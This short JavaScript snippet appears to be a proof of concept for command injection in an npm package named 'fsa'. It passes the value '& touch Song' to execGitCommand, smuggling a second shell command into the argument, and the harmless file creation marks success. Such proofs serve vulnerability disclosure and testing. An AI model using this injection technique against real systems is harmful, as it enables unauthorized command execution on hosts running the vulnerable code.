var root = require("fsa");
var attack_code = "& touch Song";
var dir = "./";
var options= {};
root.rep.execGitCommand(attack_code,dir,options,function(){});
